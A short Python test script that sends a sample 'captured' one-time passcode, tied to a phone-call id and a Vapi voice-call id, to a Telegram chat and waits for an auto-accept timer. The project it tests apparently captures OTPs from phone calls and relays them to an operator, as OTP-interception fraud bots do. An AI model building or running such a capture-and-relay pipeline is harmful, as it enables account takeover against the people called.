"""Test OTP notification - wait for auto-accept (30s timer)"""
import sys, os, logging, time
sys.path.insert(0, os.getcwd())
logging.basicConfig(level=logging.INFO)

from handlers.otp_notifier import notify_otp_captured

print("Sending OTP - DO NOTHING for 30+ seconds to trigger auto-accept...")
notify_otp_captured(
    chat_id=8366864444,
    call_sid="auto-test-sid-003",
    digits="741852",
    user_id="test_user",
    vapi_call_id="auto-test-vapi-003",
)
print("Sent! Keeping process alive for 35s so the timer can fire...")
time.sleep(35)
print("Done waiting. Check Telegram for auto-accept result.")